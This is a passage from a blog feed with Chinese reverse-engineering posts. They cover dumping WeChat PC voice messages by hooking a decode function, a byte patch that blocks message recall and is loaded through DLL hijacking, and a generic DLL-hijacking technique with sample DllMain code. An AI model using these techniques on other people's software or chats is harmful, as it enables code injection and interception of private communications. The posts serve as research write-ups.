Scan），最终找到目标数据。比如血量未知时，通过加血、减血多次搜索最终找到血量地址。</p> </li> </ol> <p><img src="/img/wx2/image001.png" alt="img"></p> <p>说到底CE内存搜索的能力就是通过各种策略帮助你找到游戏中需要修改的数据（比如血量、分数、金币等等），然后通过内存修改能力（直接改血量）打破游戏平衡，外挂制作工具生成外挂，助你超神！</p> <p>更多CE的高级应用可以访问：</p> <p><a href="https://blog.csdn.net/cgs_______/article/details/77799091" target="_blank" rel="noopener">https://blog.csdn.net/cgs<strong>___</strong>/article/details/77799091</a></p> <p><a href="https://blog.csdn.net/zhaobisheng1/article/details/79259460" target="_blank" rel="noopener">https://blog.csdn.net/zhaobisheng1/article/details/79259460</a></p> <h3 id="0x2-分析"><a href="#0x2-分析" class="headerlink" title="0x2. 分析"></a>0x2. 分析</h3><p>进入正题，本文是要拿到微信聊天的语音消息，然后dump保存下来。</p> <p>要按以前我的思路，会通过网络通信找到接受消息的函数，然后找到语音数据，看起来很简单，但是有点难。</p> <p>因为函数真的很多，网络消息也会受到很多干扰。</p> <p>现在用CE了，应该怎么办呢？</p> <h4 id="找到关键数据"><a href="#找到关键数据" class="headerlink" title="找到关键数据"></a>找到关键数据</h4><p>关键数据肯定是语音消息了，但是怎么搜索呢，肯定搜语音内容不现实，所以转了弯，先看看文字消息，找到接受文字消息处理函数之后，猜测语音处理函数会相同或者在不同分支。</p> <p>接着，如何搜索文字消息呢？已经收到的显示在聊天窗口的内容当然可以通过CE找到，但是没用啊，它和接受文字消息处理函数已经没关系了，流程已经处理完成了。</p> <p>那么在测试中肯定知道发送的消息内容，通过CE来搜索可以吗？</p> <p>额，我觉得不行，还没收到消息呢，内存中也没有这个文字消息，搜索不到（如果可以，请大佬指点一下）。</p> <p>能想到的是，在接受到消息某一点通过调试器断下来，然后CE搜索，这样可以，但是这个断点找不到阿，放弃。</p> <p>那怎么办呢？</p> <p>看到左侧聊天列表中显示的最新一条消息，有了新的思路。</p> <p><img src="/img/wx2/image003.png" alt="img"></p> <p>每次收到新消息后，都会在列表中显示最新消息内容（图中绿框指示位置、注意是unicode字符）。</p> <p>那么，先用CE（First Scan）搜索当前搜到的消息内容，找到可能的内存地址。多次接受不同消息后，Next Scan按钮搜索每次新的消息内容，最终确定聊天列表中显示的最新消息内容的内存地址。</p> <p>多次刷选之后，留下两个地址，通过CE修改内容，在界面中查看是否改变，最终确认第二个地址就是我们的目标，暂把该地址记录为MsgAddr。</p> <p><img src="/img/wx2/image005.png" alt="img"></p> <h4 id="分析消息接收函数"><a href="#分析消息接收函数" class="headerlink" title="分析消息接收函数"></a>分析消息接收函数</h4><p>关键数据地址已经找到，下面的工作复杂也不复杂，就看微信是如何实现的了。</p> <p>猜测微信实现消息显示的流程是这样的：</p> <ol> <li><p>recv收到消息，组装完整包后，分发给消息处理函数</p> </li> <li><p>根据wxid找到要显示消息的列表项，如果不在已聊天消息列表，就新建一个项</p> </li> <li><p>在列表中显示消息，如果是表情显示[文字]，语音显示为[语音]，消息插入wxid对应消息队列，或者存入数据库</p> </li> </ol> <p>步骤3中肯定要写前面找到的MsgAddr内存，把最新消息显示到界面中，这个流程肯定在消息处理函数内部。</p> <p>So，通过OD对MsgAddr下内存写入断点，回溯堆栈就可以找到消息处理函数。</p> <p>具体操作如下：</p> <p>OD挂载Wechat.exe进程后，在左下角内存窗口处Ctrl+G，输入找到的MsgAddr（11A11F34）回车，定位到该数据，然后再HEX数据处，右键弹出菜单，选择断点-&gt;内存写入。</p> <p><img src="/img/wx2/image007.png" alt="img"><br><img src="/img/wx2/image009.png" alt="img"></p> <p>断点设置完成后，测试发送文字消息，OD断住，代码窗口显示的就是修改MsgAddr的代码位置，如上图10CE412C处。</p> <p>Alt+K查看当前堆栈。</p> <p><img src="/img/wx2/image011.png" alt="img"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">调用堆栈</span><br><span class="line">地址       堆栈       函数过程 / 参数                       调用来自                      结构</span><br><span class="line">0012E068   106BD6F3   WeChatWi.10CE4110                     WeChatWi.106BD6EE             0012E064 //wcsncpy</span><br><span class="line">0012E088   106BD769   WeChatWi.106BD67E                     WeChatWi.106BD764             0012E084</span><br><span class="line">0012E09C   1011DD8B   WeChatWi.106BD753                     WeChatWi.1011DD86             0012E098</span><br><span class="line">0012E0EC   10206C67   包含WeChatWi.1011DD8B                   WeChatWi.10206C64             0012E0E8</span><br><span class="line">0012E600   1020E8F1   ? WeChatWi.10206460                   WeChatWi.1020E8EC             0012E5FC //界面操作</span><br></pre></td></tr></table></figure> <p>看到这个调用栈是不是感觉好少，分析起来肯定简单。但，其实是OD显示的并不全，此时真的很想用windbg。</p> <p>在OD的右下角堆栈窗口，可以看到当前调用栈的参数和预览数据。F8单步（或者Alt+F8执行到返回）逐步的回溯每层堆栈。关注MsgAddr的数据是如何生成的，也就是找到数据来源，然后找到消息处理函数。</p> <p><img src="/img/wx2/image013.png" alt="img"></p> <p>跟踪过程不赘述（需要熟悉汇编知识），直到看到的最顶层的WeChatWi.10206460处，发现是把收到的消息内容显示到聊天列表处的一个界面功能函数。</p> <p>那这里不是可以拿到消息了吗，是的，普通文字消息已经可以拿到，但是语音内容不行。</p> <p>通过观察内存窗口的数据，整理WeChatWi.10206460处的关于消息参数的大致结构。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//聊天列表框信息</span><br><span class="line"></span><br><span class="line">struct chat_list_msg &#123;</span><br><span class="line">DWORD unk;//</span><br><span class="line">wstring wxid;//</span><br><span class="line">//wchar_t* wxid;//4</span><br><span class="line">//int len;//8</span><br><span class="line">//int maxlen;//c</span><br><span class="line">DWORD unk1;//10</span><br><span class="line">DWORD unk2;//14</span><br><span class="line">wstring name;</span><br><span class="line">//wchar_t* name;//18微信名</span><br><span class="line">//int len;//1c</span><br><span class="line">//int maxlen;//20</span><br><span class="line">…</span><br><span class="line">wstring msg; //</span><br><span class="line">//wchar_t* msg;//3c</span><br><span class="line">//int len;//</span><br><span class="line">//int maxlen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>wstring msg字段就是文字消息内容，而语音消息则是预览中看到的[语音]两字，并没有实际能够听到的语音数据，所以还得继续往前找。</p> <p><img src="/img/wx2/image015.png" alt="img"></p> <p>继续往上回溯了3层左右，进入了102DDC50，找到了语音消息的新信息。</p> <p><img src="/img/wx2/image017.png" alt="img"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct msg_xx</span><br><span class="line">&#123;</span><br><span class="line">char unk[0x40];//</span><br><span class="line">wstring wxid1;//40</span><br><span class="line">wstring wxid2;//4c</span><br><span class="line">char unk1[0x10];//58</span><br><span class="line">wstring msg;//68</span><br><span class="line">char unk2[0x10];//74</span><br><span class="line">;//84</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>在wstring msg处就是普通文字消息内容，而语音消息并不是我想象的就是直接语音的数据，而是…如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;msg&gt;&lt;voicemsg endflag=&quot;1&quot; cancelflag=&quot;0&quot; forwardflag=&quot;0&quot; voiceformat=&quot;4&quot; voicelength=&quot;1176&quot; length=&quot;1334&quot; bufid=&quot;147445261304397871&quot; clientmsgid=&quot;416261363964373964444633636200230013013119fdd53b1f494102&quot; fromusername=&quot;wxid_xxxxxxxxx&quot; /&gt;&lt;/msg&gt;</span><br></pre></td></tr></table></figure> <p>真是一波三折，还不是语音的数据，而是关于语音信息的xml，有语音的大小，来自谁，在语音缓冲区中的id（bufid）等等信息。</p> <p>继续往前找呗，最后回溯到了所有消息处理的分发函数10323FF0中。这个函数处理逻辑很复杂，我并没有很快就找到如何生成语音消息的xml，以及处理语音数据的函数。</p> <p>一度卡住，重复分析了很多次。</p> <p>后来又回神想到了逆向神器IDA，xml中数据如voicemsg肯定是模块中会在代码中用到，看看有没有有用的信息。</p> <p>用IDA打开Wechatwin.dll，shift+F12分析出所有字符串，Ctrl+F找到关键字voicemsg，看来有戏。</p> <p><img src="/img/wx2/image019.png" alt="img"></p> <p>真的是柳暗花明又一村。</p> <p>点击字符串跳到代码窗口，按下x，跳到引用该数据的位置。</p> <p><img src="/img/wx2/image021.png" alt="img"></p> <p>找到了解析语音xml数据和解码语音数据的关键函数。</p> <p><img src="/img/wx2/image023.png" alt="img"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">f_parseVoiceXmlInfo_103148E0</span><br><span class="line">text:103149DD 0E4 0F 84 74 02 00 00                             jz      loc_10314C57</span><br><span class="line">.text:103149E3 0E4 68 D0 06 F0 10                                push    offset aVoicemsg ; &quot;voicemsg&quot;</span><br><span class="line">.text:103149E8 0E8 8B CF                                         mov     ecx, edi</span><br><span class="line">.text:103149EA 0E8 E8 31 28 3E 00                                call    f_xml_subnode_106F7220</span><br><span class="line">.text:103149EF 0E4 85 C0                                         test    eax, eax</span><br><span class="line">.text:103149F1 0E4 0F 84 60 02 00 00                             jz      loc_10314C57</span><br><span class="line">.text:103149F7 0E4 8D 70 2C                                      lea     esi, [eax+2Ch]</span><br><span class="line">.text:103149FA 0E4 68 C4 06 F0 10                                push    offset aClientmsgid ; &quot;clientmsgid&quot;</span><br><span class="line">.text:103149FF 0E8 8B CE                                         mov     ecx, esi</span><br><span class="line">.text:10314A01 0E8 E8 CA 3A 3E 00                                call    f_xml_getvalue_106F84D0</span><br></pre></td></tr></table></figure> <p>函数103148E0解析xml拿到几个字段的内容，返回上层函数调用一个语音解码的函数进行处理，而这个解码函数就会直接操作语音数据。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(*(void (__thiscall **)(int *, _DWORD, _DWORD, int *, signed int))(*v7</span><br><span class="line">                                                                            + 28))(//</span><br><span class="line">             v7,</span><br><span class="line">             *(_DWORD *)(voice_msg + 48),      // 语音内容</span><br><span class="line">             *(_DWORD *)(voice_msg + 52),      // 语音长度</span><br><span class="line">             v17,</span><br><span class="line">             v4);</span><br></pre></td></tr></table></figure> <p>函数103148E0回溯再看看，进入了分发函数10323FF0中，在一个循环中处理了多种流程，包括显示界面最新消息的流程和解码语音的流程。所以前面找的方向并没有问题，只是缺少认真分析数据和代码的耐心。</p> <p>不过，目的都达到了，找到了数据处理函数，最后通过hook这个函数就能拿到语音数据。</p> <p>另外可以看到语音数据中包含SILK_V3的字符，这种编码音频格式是Skpye曾经使用的一种编码方式，后来开源了。目前播放器并不能直接播放该编码音频文件，所以需要转码为MP3等格式。不过可喜的是已经有大佬完成了这个工作，并开源了工具silk-v3-decoder。所以把代码拿来整合一下，就可以完整的实现实时dump语音聊天数据，转换为mp3进行保存，完美。</p> <p><img src="/img/wx2/image025.png" alt="img"></p> <h3 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3. 总结"></a>0x3. 总结</h3><p>这是第一次比较成功的应用CE，整个看来，确实省下来很多定位数据和函数的工作。</p> <p>但CE并不是万能的，要找对方法，找对目标数据才可能成功，对于某些没有明显数据的功能，可能也是无能为力。</p> <p>最终还是得提高对大型软件的逆向能力，总体实现思路的猜测以及调试验证。</p> <p>最后，时间仓促，目前只是将保存语音的demo更新到到SuperWeChatPC项目中，后续会持续更新，欢迎关注。</p> <p>转载请注明出处：<a href="https://anhkgg.com/wechat-voice/" target="_blank" rel="noopener">https://anhkgg.com/wechat-voice/</a></p> ]]></content>          <summary type="html">            &lt;p&gt;欢迎关注技术公众号：&lt;strong&gt;&lt;span style=&quot;color:red&quot;&gt;汉客儿&lt;/span&gt;&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/img/wx.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;微信PC端技术研究-保存聊天语音&lt;br&gt;by anhkgg（公众号：汉客儿）&lt;br&gt;2019年1月31日&lt;/p&gt; &lt;/blockquote&gt; &lt;h3 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0. 前言&quot;&gt;&lt;/a&gt;0x0. 前言&lt;/h3&gt;&lt;p&gt;虽然一直知道CE，也用过一段时间，但一直用不好，可能太笨。&lt;/p&gt; &lt;p&gt;最近又学习了某位大佬用CE的方法，大佬的一句话有点醍醐灌顶，然后有了新的感觉，然后开始尝试实践这篇文章。&lt;/p&gt; &lt;p&gt;自己总结一下CE用法的核心思路：通过各种技巧搜索找到内存中关键数据，然后结合动态调试找到操作数据的函数。&lt;/p&gt; &lt;p&gt;准备工具：Cheat Engine，OllyDbg，IDA。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="reverse" scheme="https://anhkgg.github.io/tags/reverse/"/>            <category term="wechat" scheme="https://anhkgg.github.io/tags/wechat/"/>        </entry>      <entry>     <title>微信PC端技术研究-消息防撤销</title>     <link href="https://anhkgg.github.io/wechat-revoke/"/>     <id>https://anhkgg.github.io/wechat-revoke/</id>     <published>2018-12-01T03:32:27.000Z</published>     <updated>2019-03-09T01:51:45.286Z</updated>          <content type="html"><![CDATA[<p>欢迎关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> <blockquote> <p>微信PC端技术研究-消息防撤销<br>by anhkgg<br>2018年11月30日</p> </blockquote> <h2 id="0x1-写在前面"><a href="#0x1-写在前面" class="headerlink" title="0x1. 写在前面"></a>0x1. 写在前面</h2><p>不知道大家有没有遇到过这种情况，微信收到消息，但是没有及时查看，然后闲暇时去看的时候，消息被撤销了，撤销了！</p> <p>那时肯定是无比无语，挠心挠肺，究竟发了什么？</p> <p>有没有一种神器可以防消息撤销呢，有的！其实移动端和mac上已经有人做了相关的插件，但是PC端貌似没人来啃这块骨头。</p> <p>当然也可能是我没找到，不过不管怎样，对我来说就是没有。</p> <p>既然如此，小生来！</p> <a id="more"></a> <h2 id="0x2-技术分析"><a href="#0x2-技术分析" class="headerlink" title="0x2. 技术分析"></a>0x2. 技术分析</h2><p>先理一下思路：</p> <p>1.对方发送消息之后，我收到消息并在消息窗口显示<br><br>2.然后对方点击菜单选择撤销<br><br>3.我会收到发来的撤销通知，然后删除消息窗口显示的消息</p> <p>所以分析方向就基本定为两个方向了：</p> <p>1.一个是通过分析网络消息找到撤销消息，然后拦截该消息阻止消息被撤销<br><br>2.另一个是找到撤销消息的界面操作，patch掉这个撤销消息的操作即可</p> <p>开始之前，先了解一下微信主要模块都实现什么功能。</p> <table> <thead> <tr> <th>模块</th> <th>功能</th> </tr> </thead> <tbody> <tr> <td>WeChat.exe</td> <td>主程序，初始化操作，加载WeChatWin.dll</td> </tr> <tr> <td>WeChatWin.dll</td> <td>主要功能模块，包括界面、网络、功能</td> </tr> <tr> <td>wechatresource.dll</td> <td>保存资源的模块，包括界面资源</td> </tr> </tbody> </table> <p>主要分析目标就是WeChatWin.dll，其实很早之前就想分析这个东西了，但是那时候的老版本vmp壳加的更严重（映像中是，无法考证），所以搁置很久。</p> <p>当前我分析的版本应该是最新的<code>2.6.5.38</code>，目前来看加壳程度还行，基本都是比较好分析的代码，没有经过加壳处理，不过听说核心代码还是处理过的。</p> <h3 id="1-界面入手"><a href="#1-界面入手" class="headerlink" title="1. 界面入手"></a>1. 界面入手</h3><p>首先试试从界面入手，都知道微信界面使用duilib实现的，所以可以从它的某些特征入手分析，比如字符串<code>click</code>等，可以快速找到功能函数。</p> <p>想的是通过<code>click</code>找到整个窗口响应函数，然后再分析找到撤销操作的代码位置。</p> <p>确实很快就看到了窗口响应函数，不过大概有119个相关函数，所以无奈放弃。</p> <p>换一个方向，通过菜单入手，搜索<code>menu</code>找到<code>menuCmdDelete</code>，<code>menuCmdRevoke</code>等字符串，<code>menuCmdRevoke</code>就是撤销菜单对应的名字。有29个相关函数，还行。结合调试，尝试了几个函数，果然找到了删除、撤销对应的响应函数。然后想通过删除菜单来找到删除界面消息的代码，而被撤销消息其实也是删除界面消息，不过折腾了一圈未果。</p> <h3 id="2-网络入手"><a href="#2-网络入手" class="headerlink" title="2. 网络入手"></a>2. 网络入手</h3><p>通过<code>recv</code>回溯到接收网络消息的函数中，40个，有点多。找了个tcp抓包工具，想抓到撤销消息的调用堆栈，结果一直被其他消息干扰，无果。</p> <h3 id="3-取巧"><a href="#3-取巧" class="headerlink" title="3. 取巧"></a>3. 取巧</h3><p>函数太多，分析很费实践，想看看有没有其他路可以走。在字符串中搜索<code>revoke</code>发现很多看起来有用的调试信息，不过也有79条之多。然后通过筛选和调试确认，找到了<code>On RevokeMsg svrId : %d</code>，然后回溯到撤销消息处理的函数中。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ( sub_10247BF0((wchar_t *)v258, (int)v259, (int)v260, v261) )</span><br><span class="line">&#123;                             // 撤销消息</span><br><span class="line">*(_OWORD *)&amp;v259 = xmmword_10E6A278;</span><br><span class="line">v257 = xmmword_10E6A278;</span><br><span class="line">v256 = xmmword_10E6A278;</span><br><span class="line">v255 = xmmword_10E6A278;</span><br><span class="line">*(_OWORD *)&amp;v251 = xmmword_10E6A278;</span><br><span class="line">sub_1007E090(&amp;v247, v353, SHIDWORD(v353));</span><br><span class="line">f_log_10471580(</span><br><span class="line">  (int)&quot;02_manager\\SyncMgr.cpp&quot;,</span><br><span class="line">  2,</span><br><span class="line">  1357,</span><br><span class="line">  (int)&quot;SyncMgr::doAddMsg&quot;,</span><br><span class="line">  (int)&quot;SyncMgr&quot;,</span><br><span class="line">  &quot;On RevokeMsg svrId : %d&quot;,</span><br></pre></td></tr></table></figure> <p>经过调试发现<code>sub_10247BF0</code>返回1则进入撤销消息处理中，消息被撤销，跳过此段代码，消息不会被撤销，所以patch掉<code>sub_10247BF0</code>这个函数的返回值使其一直为0即可完成防撤销的功能。</p> <p>当然也不能太随意了，还是看看这个函数大概做了些什么处理吧。关键参数第一个，调试中发现值如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;sysmsg type=&quot;revokemsg&quot;&gt;</span><br><span class="line">    &lt;revokemsg&gt;</span><br><span class="line">        &lt;session&gt;wxid_0811111140112&lt;/session&gt;</span><br><span class="line">        &lt;msgid&gt;1111000048&lt;/msgid&gt;</span><br><span class="line">        &lt;newmsgid&gt;11411701182813217&lt;/newmsgid&gt;</span><br><span class="line">        &lt;replacemsg&gt;&lt;![CDATA[&quot;xxx&quot; 撤回了一条消息]]&gt;&lt;/replacemsg&gt;</span><br><span class="line">    &lt;/revokemsg&gt;</span><br><span class="line">&lt;/sysmsg&gt;</span><br></pre></td></tr></table></figure> <p><code>sub_10247BF0</code>解析发现<code>type=&quot;revokemsg&quot;</code>即判断为撤销消息操作，返回1，很明了。</p> <p><strong>小结</strong>：此次分析运气较好，通过revoke找到关键代码，少花了很多时间，其实通过网络方向堆栈筛选确认应该也是可以找到这段代码的，但是通过结果去看，发现有近10层调用栈，肯定会花成倍的时间才能找到关键代码。</p> <h2 id="0x3-实现"><a href="#0x3-实现" class="headerlink" title="0x3. 实现"></a>0x3. 实现</h2><p>分析是为了最后能够用起来，所以用上一篇文章《一种通用Dll劫持技术》写了一个简单的包含patch代码（没有用hook）的dll模块，劫持微信的WeChatResource.dll来完成加载。</p> <p>关键代码如下所示，patch了<code>sub_10247BF0</code>返回值所在代码，让其eax永远为0。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bool FakeRevokeMsg()</span><br><span class="line">&#123;</span><br><span class="line"> if (!IsSupportedWxVersion()) &#123;</span><br><span class="line">  return false;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //33 C0                xor eax,eax </span><br><span class="line"> BYTE code[] = &#123; 0x33, 0xc0, 0x90 &#125;;</span><br><span class="line"> HMODULE hMod = GetModuleHandle(WECHATWINDLL);</span><br><span class="line"> DWORD offset = 0x247EF1;//返回值处</span><br><span class="line"> if (!hMod) &#123;</span><br><span class="line">  return false;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> PVOID addr = (BYTE*)hMod + offset;</span><br><span class="line"> Patch(addr, 3, code);</span><br><span class="line"></span><br><span class="line"> return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>最后惯例，放上github地址：<a href="https://github.com/anhkgg/SuperWeChatPC" target="_blank" rel="noopener">https://github.com/anhkgg/SuperWeChatPC</a></p> <p>转载请注明出处：<a href="https://anhkgg.com/wechat-revoke" target="_blank" rel="noopener">https://anhkgg.com/wechat-revoke</a></p> <p>公众号文章链接：<a href="https://mp.weixin.qq.com/s/E7N6LzAH4p88Gu4f_qwGlg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/E7N6LzAH4p88Gu4f_qwGlg</a></p> <p>欢迎关注公众号：<strong>汉客儿</strong>或加入QQ交流群：<strong>753894145</strong></p> ]]></content>          <summary type="html">            &lt;p&gt;欢迎关注技术公众号：&lt;strong&gt;&lt;span style=&quot;color:red&quot;&gt;汉客儿&lt;/span&gt;&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/img/wx.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;微信PC端技术研究-消息防撤销&lt;br&gt;by anhkgg&lt;br&gt;2018年11月30日&lt;/p&gt; &lt;/blockquote&gt; &lt;h2 id=&quot;0x1-写在前面&quot;&gt;&lt;a href=&quot;#0x1-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x1. 写在前面&quot;&gt;&lt;/a&gt;0x1. 写在前面&lt;/h2&gt;&lt;p&gt;不知道大家有没有遇到过这种情况，微信收到消息，但是没有及时查看，然后闲暇时去看的时候，消息被撤销了，撤销了！&lt;/p&gt; &lt;p&gt;那时肯定是无比无语，挠心挠肺，究竟发了什么？&lt;/p&gt; &lt;p&gt;有没有一种神器可以防消息撤销呢，有的！其实移动端和mac上已经有人做了相关的插件，但是PC端貌似没人来啃这块骨头。&lt;/p&gt; &lt;p&gt;当然也可能是我没找到，不过不管怎样，对我来说就是没有。&lt;/p&gt; &lt;p&gt;既然如此，小生来！&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="wechat" scheme="https://anhkgg.github.io/tags/wechat/"/>            <category term="anti-revoke" scheme="https://anhkgg.github.io/tags/anti-revoke/"/>        </entry>      <entry>     <title>一种通用Dll劫持技术研究</title>     <link href="https://anhkgg.github.io/dllhijack/"/>     <id>https://anhkgg.github.io/dllhijack/</id>     <published>2018-11-29T09:45:46.000Z</published>     <updated>2019-03-09T01:52:13.107Z</updated>          <content type="html"><![CDATA[<p>欢迎关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> <blockquote> <p>通用DLL劫持技术研究<br><br>by anhkgg<br><br>2018年11月29日<br></p> </blockquote> <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>Dll劫持相信大家都不陌生，理论就不多说了。Dll劫持的目的一般都是为了自己的dll模块能够在别人进程中运行，然后做些不可描述的事情。</p> <p>为了让别人的程序能够正常运行，通常都需要在自己的dll中导出和劫持的目标dll相同的函数接口，然后在自己的接口函数中调用原始dll的函数，如此使得原始dll的功能能够正常被使用。导出接口可以自己手工写，也可以通过工具自动生成，比如著名的<code>Aheadlib</code>。这种方法的缺点就是针对不同的dll需要导出不同的接口，虽然有工具帮助，但也有限制，比如不支持x64。</p> <a id="more"></a> <p>除此之外，很早之前就知道一种通用dll劫持的方法，原理大致是在自己的dll的dllmian中加载被劫持dll，然后修改loadlibrary的返回值为被劫持dll加载后的模块句柄。这种方式就是自己的dll不用导出和被劫持dll相同的函数接口，使用更加方便，也更加通用。</p> <p>下面就尝试分析一下如何实现这种通用的dll劫持方法。</p> <h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>随便写一个测试代码：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//mydll.dll 伪造的用于劫持mydll.dll的dll代码</span><br><span class="line">//mydll.dll.1是把test.exe加载的原始dll修改为这个名字</span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        __debugbreak();</span><br><span class="line">        HMODULE hmod = LoadLibraryW(&quot;mydll.dll.1&quot;);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">//test.exe</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    LoadLibraryW(L&quot;mydll.dll&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>用windbg加载看看堆栈，如下所示。在test中通过LoadLibraryW加载mydll.dll，最后进入mydll!DllMain。现在需要分析系统映射dll之后是如何把基地址返回给LoadLibraryW，然后才能想办法把这个值给修改成加载mydll.dll.1的值。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; kvn</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00 0025eaf8 6e4112ec 6e410000 00000000 00000000 mydll+0x101d</span><br><span class="line">01 0025eb38 6e4113c9 6e410000 00000001 00000000 mydll+0x12ec</span><br><span class="line">02 0025eb4c 77d889d8 6e410000 00000001 00000000 mydll!DllMain+0x13</span><br><span class="line">03 0025eb6c 77d95c41 6e4113ad 6e410000 00000001 ntdll!LdrpCallInitRoutine+0x14</span><br><span class="line">04 0025ec60 77d9052e 00000000 74e92d11 77d77c9a ntdll!LdrpRunInitializeRoutines+0x26f (FPO: [Non-Fpo])</span><br><span class="line">05 0025edcc 77d9232c 0025ee2c 0025edf8 00000000 ntdll!LdrpLoadDll+0x4d1 (FPO: [Non-Fpo])</span><br><span class="line">06 0025ee00 75ee88ee 0037429c 0025ee40 0025ee2c ntdll!LdrLoadDll+0x92 (FPO: 